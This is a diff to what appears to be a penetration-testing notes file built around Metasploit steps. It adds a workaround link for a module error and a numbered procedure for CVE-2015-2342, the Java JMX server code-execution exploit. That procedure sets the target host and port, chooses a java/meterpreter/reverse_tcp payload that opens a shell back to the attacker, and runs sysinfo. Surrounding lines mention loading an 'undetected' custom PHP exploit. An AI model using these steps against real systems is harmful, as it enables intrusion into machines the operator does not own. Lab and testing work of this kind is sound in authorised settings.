@@ -70,8 +70,17 @@ Creating undiscovered exploit:
 	6. set payload generic/custom
 	7. set payloadfile <PATHTOEXPLOIT> (e.g /root/cve_2016-2019_undetected.php)
 	8. run
-5. 
+	Note: If you get the following error 
+	Exploit failed: NoMethodError undefined method '[]' for nil:nilClass
+	Make sure you have version with this fix implemented:
+	https://github.com/rapid7/metasploit-framework/commit/f838c9990fa3a7858297ada47288cc67f04d87e4
 
-Exploit failed: NoMethodError undefined method '[]' for nil:nilClass
-FIX:
-https://github.com/rapid7/metasploit-framework/commit/f838c9990fa3a7858297ada47288cc67f04d87e4
+5. CVE-2015-2342 - Java JMX Server Insecure Configuration Java Code Execution
+	1. use exploit/multi/misc/java_jmx_server
+	2. set RHOST <REMOTEHOST>
+	3. set RPORT 1617
+	4. set payload java/meterpreter/reverse_tcp
+	5. set LHOST <LOCALHOST>
+	6. run
+	7. sysinfo
+	8. exit
